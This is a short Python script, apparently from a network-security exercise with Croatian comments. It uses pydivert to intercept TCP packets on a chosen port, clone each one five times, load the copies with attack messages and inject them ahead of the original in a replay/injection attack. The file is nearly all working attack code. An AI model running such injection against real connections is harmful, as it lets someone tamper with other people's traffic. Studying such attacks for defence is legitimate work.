import  pydivert
from sniff import *
"Kopiranje uhvacenog paketa"
def copy_packet(original_packet):
    new_packet = pydivert.Packet(raw=original_packet.raw,
                                 direction=original_packet.direction,
                                 interface=original_packet.interface)
    new_packet.src_addr = original_packet.src_addr
    new_packet.dst_addr = original_packet.dst_addr
    new_packet.src_port = original_packet.src_port
    new_packet.dst_port = original_packet.dst_port
    #new_packet.protocol = original_packet.protocol
    return new_packet

def replayAttack(sourcePort):
    with pydivert.WinDivert(f"tcp.DstPort == {sourcePort} and tcp.PayloadLength == 11") as w:
        for packet in w:
            attackMessages = takeMessagesForAttack() # vadim poruke za napad
            copyList = [copy_packet(packet) for i in range(5)] #kopira se originalni paket kako bi se mogao napuniti sa payloadovima novim
            for i in range(len(copyList)):
                copyList[i].payload = attackMessages[i] #puni se
            [w.send(copyList[j]) for j in range(len(copyList))] #salje se svaka kopija
            w.send(packet) #salje se originalni
